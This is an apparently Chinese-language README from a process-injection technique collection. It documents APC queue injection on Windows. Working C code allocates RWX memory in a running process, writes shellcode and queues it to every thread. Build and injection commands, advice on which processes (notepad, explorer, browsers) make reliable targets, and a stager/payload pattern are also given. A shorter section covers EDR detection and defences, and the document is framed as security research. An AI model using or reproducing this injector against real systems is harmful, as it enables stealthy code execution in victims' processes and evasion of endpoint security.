# Technique #18: APC Queue Injection

## 概述

**APC Queue Injection** 是一种进程注入技术，通过向运行中进程的所有线程的 APC（Asynchronous Procedure Call）队列注入 shellcode，在线程进入 alertable 状态时执行代码。

**关键特性**：
- ✅ 利用 Windows APC 机制
- ✅ 向所有线程的 APC 队列注入
- ✅ 不创建新线程（不触发 CreateRemoteThread 检测）
- ✅ 在线程的正常执行流程中触发
- ⚠️ 需要目标线程进入 alertable 状态
- ⚠️ 执行时机不确定（取决于线程何时进入 alertable 状态）

---

## 技术原理

### 什么是 APC？

**APC (Asynchronous Procedure Call)** 是 Windows 提供的异步回调机制，允许线程在将来的某个时刻异步执行特定函数。

```
┌─────────────────────────────────────────────────────────────┐
│                      APC 工作原理                            │
└─────────────────────────────────────────────────────────────┘

每个线程都有自己的 APC 队列：

┌────────────────┐
│  Thread A      │
│  ┌──────────┐  │
│  │APC Queue │  │ ← 可以向这个队列添加 APC
│  ├──────────┤  │
│  │ APC 1    │  │
│  │ APC 2    │  │
│  │ APC 3    │  │
│  └──────────┘  │
└────────────────┘

当线程进入 alertable 状态时，系统会自动执行队列中的 APC。
```

### Alertable 状态

**什么是 alertable 状态？**

线程在调用某些等待函数时，可以指定进入 alertable 状态。在此状态下，系统会检查并执行该线程的 APC 队列。

**触发 alertable 状态的 API**：
```c
// 1. 睡眠并允许 APC 执行
SleepEx(dwMilliseconds, TRUE);  // bAlertable = TRUE

// 2. 等待对象并允许 APC 执行
WaitForSingleObjectEx(hObject, dwMilliseconds, TRUE);

// 3. 等待多个对象
WaitForMultipleObjectsEx(nCount, lpHandles, bWaitAll, dwMilliseconds, TRUE);

// 4. 消息等待
MsgWaitForMultipleObjectsEx(nCount, pHandles, dwMilliseconds, dwWakeMask, MWMO_ALERTABLE);

// 5. 信号并等待
SignalObjectAndWait(hObjectToSignal, hObjectToWaitOn, dwMilliseconds, TRUE);
```

**常见场景**：
- GUI 程序的消息循环（`GetMessage`, `PeekMessage`）
- 网络 I/O 操作（`WSARecv`, `WSASend` 的完成例程）
- 文件 I/O 操作（`ReadFileEx`, `WriteFileEx`）
- 线程等待（`WaitForSingleObjectEx`）

### APC Queue Injection vs Early Bird APC

| 特性 | APC Queue Injection | Early Bird APC Injection |
|------|---------------------|--------------------------|
| **注入时机** | 进程运行时 | 进程启动前（挂起状态） |
| **目标线程** | 所有现有线程 | 主线程 |
| **执行时机** | 线程进入 alertable 状态时 | 进程启动后立即 |
| **确定性** | 不确定（取决于线程行为） | 确定（必然执行） |
| **成功率** | 中（取决于目标程序类型） | 高 |
| **适用场景** | GUI 程序、网络程序 | 任意新进程 |
| **隐蔽性** | 高 | 高 |

### 完整执行流程

```
┌─────────────────────────────────────────────────────────────┐
│              APC Queue Injection 执行流程                    │
└─────────────────────────────────────────────────────────────┘

[1] 注入器进程
    ┌────────────────┐
    │ OpenProcess    │ ← 打开目标进程
    └────────────────┘
           │
           v
    ┌────────────────┐
    │ VirtualAllocEx │ ← 分配 RWX 内存
    └────────────────┘
           │
           v
    ┌────────────────┐
    │WriteProcessMemory│ ← 写入 shellcode
    └────────────────┘
           │
           v
    ┌────────────────┐
    │ Enumerate      │ ← 枚举所有线程
    │ Threads        │    (CreateToolhelp32Snapshot)
    └────────────────┘
           │
           v
    ┌────────────────┐
    │ For each       │
    │ thread:        │
    │  OpenThread    │
    │  QueueUserAPC  │ ← 将 shellcode 地址加入 APC 队列
    └────────────────┘

[2] 目标进程（异步执行）
    ┌────────────────┐
    │ Thread 执行... │
    └────────────────┘
           │
           v
    ┌────────────────┐
    │ 调用 SleepEx   │ ← 进入 alertable 状态
    │ 或其他 API     │
    └────────────────┘
           │
           v
    ┌────────────────┐
    │ 系统检查       │
    │ APC 队列       │
    └────────────────┘
           │
           v
    ┌────────────────┐
    │ 执行 APC       │ ← shellcode 被执行！
    │ (shellcode)    │
    └────────────────┘
           │
           v
    ┌────────────────┐
    │ 返回正常执行   │
    └────────────────┘
```

---

## 代码实现

### 核心函数

```c
BOOL InjectShellcodeToProcess(DWORD pid, unsigned char *shellcode, size_t shellcode_size)
{
    // 1. 打开目标进程
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

    // 2. 分配远程内存
    LPVOID remoteMemory = VirtualAllocEx(hProcess, NULL, shellcode_size,
                                        MEM_COMMIT | MEM_RESERVE,
                                        PAGE_EXECUTE_READWRITE);

    // 3. 写入 shellcode
    WriteProcessMemory(hProcess, remoteMemory, shellcode, shellcode_size, &bytesWritten);

    // 4. 枚举目标进程的所有线程
    DWORD *threads = EnumerateProcessThreads(pid, &threadCount);

    // 5. 向每个线程的 APC 队列注入
    for (DWORD i = 0; i < threadCount; i++) {
        HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, threads[i]);
        QueueUserAPC((PAPCFUNC)remoteMemory, hThread, 0);
        CloseHandle(hThread);
    }

    return TRUE;
}
```

### 枚举线程函数

```c
DWORD* EnumerateProcessThreads(DWORD pid, DWORD *threadCount)
{
    // 创建线程快照
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);

    THREADENTRY32 te32 = {0};
    te32.dwSize = sizeof(THREADENTRY32);

    // 遍历所有线程
    if (Thread32First(hSnapshot, &te32)) {
        do {
            if (te32.th32OwnerProcessID == pid) {
                // 收集属于目标进程的线程
                threads[index++] = te32.th32ThreadID;
            }
        } while (Thread32Next(hSnapshot, &te32));
    }

    CloseHandle(hSnapshot);
    return threads;
}
```

---

## 编译和使用

### 编译

```bash
# Windows (cmd)
cd techniques/18-apc-queue-injection
build.bat

# Linux/MSYS (bash)
chmod +x build.sh
./build.sh
```

**输出文件**：
- `build/apc_queue_injection.exe` - 注入器
- `build/generate_shellcode.exe` - Shellcode 生成器
- `build/payload.bin` - 默认测试 shellcode

### 使用方法

#### 1. 生成 Shellcode

```bash
# MessageBox
build\generate_shellcode.exe messagebox payload.bin

# Calculator
build\generate_shellcode.exe calc payload.bin
```

#### 2. 执行注入

```bash
# 按进程名注入
build\apc_queue_injection.exe notepad.exe build\payload.bin

# 按 PID 注入
build\apc_queue_injection.exe 1234 build\payload.bin
```

### 测试步骤

1. **启动目标进程**（选择会进入 alertable 状态的程序）：
   ```bash
   start notepad.exe
   ```

2. **执行注入**：
   ```bash
   build\apc_queue_injection.exe notepad.exe build\payload.bin
   ```

3. **触发执行**：
   - 对于 GUI 程序（如记事本），继续正常操作即可
   - 消息循环会自动进入 alertable 状态
   - Shellcode 会在短时间内执行

---

## 目标进程类型分析

### 高成功率目标

#### 1. GUI 应用程序
**为什么？** 消息循环频繁进入 alertable 状态

```c
// 典型的 Windows 消息循环
while (GetMessage(&msg, NULL, 0, 0)) {
    TranslateMessage(&msg);
    DispatchMessage(&msg);
}

// GetMessage 内部调用 MsgWaitForMultipleObjectsEx
// 允许 APC 执行
```

**适合的目标**：
- 记事本 (notepad.exe)
- 画图 (mspaint.exe)
- 资源管理器 (explorer.exe)
- 任何 Win32 GUI 程序

#### 2. 网络程序
**为什么？** 异步 I/O 操作使用 alertable 等待

```c
// 异步套接字操作
WSABUF wsaBuf;
DWORD flags = 0;

WSARecv(socket, &wsaBuf, 1, NULL, &flags,
        &overlapped, CompletionRoutine);  // ← 完成例程通过 APC 调用

// WSARecv 内部会导致线程进入 alertable 状态
```

**适合的目标**：
- 浏览器
- FTP 客户端
- 聊天软件

#### 3. 文件 I/O 密集程序
**为什么？** 异步文件操作使用 alertable 等待

```c
// 异步文件读取
ReadFileEx(hFile, buffer, size, &overlapped, CompletionRoutine);

// 线程在等待 I/O 完成时可能进入 alertable 状态
```

### 低成功率目标

#### 1. 控制台程序
**为什么？** 通常不使用 alertable 等待

```c
// 典型的控制台程序
while (1) {
    // 直接计算，不等待
    DoSomeWork();

    // 或者使用非 alertable 的 Sleep
    Sleep(1000);  // ← 不是 SleepEx(..., TRUE)
}
```

#### 2. 服务进程
**为什么？** 可能使用不同的等待机制

**例外**：某些服务确实使用 alertable 等待（如 RPC 服务）

---

## 检测和防御

### EDR 检测方法

#### 1. API Hook

**监控 QueueUserAPC**：
```c
Hook: kernel32!QueueUserAPC
  if (TargetThread不属于当前进程) {
      // 跨进程 APC - 可疑
      if (APC函数地址 不在已知模块) {
          // APC 指向未知内存 - 高度可疑
          Alert();
      }
  }
```

#### 2. 内存扫描

**检测异常 APC**：
```c
// 遍历进程的所有线程
for (each thread) {
    // 获取线程 APC 队列（未公开 API）
    // 检查 APC 回调地址
    if (APC地址 不在已知模块) {
        // 可疑的 APC
        Alert();
    }
}
```

#### 3. 行为监控

**检测模式**：
```
OpenProcess(目标进程)
  ↓
VirtualAllocEx(RWX)
  ↓
WriteProcessMemory
  ↓
多次 OpenThread + QueueUserAPC  ← 可疑模式
```

### 防御方法

#### 1. 禁用 APC 投递

```c
// 内核驱动中
// ObRegisterCallbacks 拦截 OpenThread
// 阻止未授权的 THREAD_SET_CONTEXT 访问
```

#### 2. APC 白名单

```c
// 只允许已知模块的 APC
// 拦截未知内存地址的 APC
```

#### 3. 实时监控

```c
// EDR 实时监控：
// 1. QueueUserAPC 到其他进程
// 2. APC 函数地址不在已知模块
// 3. 大量 APC 队列操作
```

---

## 限制和注意事项

### 1. 执行时机不确定

**问题**：依赖目标线程进入 alertable 状态

**影响**：
- 可能立即执行（GUI 程序）
- 可能延迟执行（控制台程序）
- 可能永不执行（线程从不进入 alertable 状态）

**解决方案**：
- 选择合适的目标进程类型
- 向多个线程注入（提高成功率）

### 2. Shellcode 限制

**问题**：Shellcode 在 APC 回调中执行

**影响**：
- 执行时间应该短
- 不应阻塞线程
- 最好创建新线程执行复杂操作

**推荐模式**：
```c
// 推荐：Stager + Payload
// 1. APC 执行小型 stager
// 2. Stager 创建新线程
// 3. 新线程执行完整 payload

void APCRoutine(ULONG_PTR param) {
    // 创建新线程执行真正的 payload
    CreateThread(NULL, 0, RealPayload, NULL, 0, NULL);
    // APC 立即返回
}
```

### 3. 多次执行

**问题**：如果向多个线程注入，shellcode 可能被多次执行

**影响**：
- 资源浪费
- 可能引起崩溃（如果 shellcode 不是线程安全的）

**解决方案**：
```c
// 使用原子操作确保只执行一次
static volatile LONG executed = 0;

void Shellcode() {
    if (InterlockedCompareExchange(&executed, 1, 0) == 0) {
        // 只有第一个线程执行这里
        RealPayload();
    }
    // 其他线程直接返回
}
```

---

## 与其他 APC 技术的对比

| 技术 | Early Bird APC | APC Queue Injection | APC Injection (DLL) |
|------|----------------|---------------------|---------------------|
| **目标进程状态** | 挂起（新进程） | 运行中 | 运行中 |
| **注入时机** | 进程启动前 | 任意时刻 | 任意时刻 |
| **创建进程** | ✅ 需要 | ❌ 不需要 | ❌ 不需要 |
| **执行确定性** | 高（必然执行） | 中（取决于线程） | 中（取决于线程） |
| **隐蔽性** | 高 | 高 | 中 |
| **适用场景** | 启动新进程 | 注入现有进程 | DLL 注入 |

---

## 参考资料

- [APC Queue Injection - Rust Implementation](https://github.com/0xflux/Rust-APC-Queue-Injection)
- [Flux Security Blog - APC Queue Injection](https://fluxsec.red/apc-queue-injection-rust)
- [MSDN - Asynchronous Procedure Calls](https://docs.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls)
- [MSDN - QueueUserAPC](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc)
- [ired.team - APC Injection](https://www.ired.team/offensive-security/code-injection-process-injection/apc-queue-code-injection)

---

## License

本项目仅用于安全研究和教育目的。
